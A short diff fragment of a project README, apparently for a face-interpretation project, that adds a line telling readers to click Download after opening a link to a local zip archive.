@@ -30,6 +30,7 @@ Here is a clean, organized breakdown of your project structure. This layout help
 ## 📂 Project Architecture
 
 ### [**Project Link**](./source/openai-faceInterpretor.zip)
+*(Click on Download after opened the link.)*
 
 ### 🐳 Docker (Intelligence Layer)
 
